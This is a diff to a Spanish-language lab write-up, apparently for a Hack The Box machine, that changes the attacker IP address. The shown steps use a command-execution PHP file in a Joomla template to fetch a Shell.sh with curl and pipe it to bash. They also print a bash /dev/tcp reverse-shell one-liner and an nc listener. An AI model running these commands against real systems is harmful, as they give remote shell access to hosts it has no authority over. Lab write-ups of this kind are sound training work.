@@ -107,16 +107,16 @@ bash -i >& /dev/tcp/10.10.14.5/443
 Teniendo el servidor `python3 -m http.server 80` montado alojando el recurso `Shell.sh`
 Procedemos a hacer la Peticion Web:
 ```bash
-  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.16.132/Shell.sh"
+  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh"
 ```
 Como output: Vemos que se nos lee el codigo tipo:
-`#!/bin/bash bash -i >& /dev/tcp/10.10.16.132/443 0>&1 `
+`#!/bin/bash bash -i >& /dev/tcp/10.10.14.5/443 0>&1 `
 
 Nos preparamos y nos ponemos a la escucha con `nc -vnlp 443` para recibir la shell.
 Ahora paso clave: Pipearlo con `BASH`
 Para lograr que se ejecute ahora el codigo:
 ```bash
-  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.16.132/Shell.sh|bash"
+  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh|bash"
 ```
 Y de este modo conseguimos nuestra consola como `www-data`
 ```bash
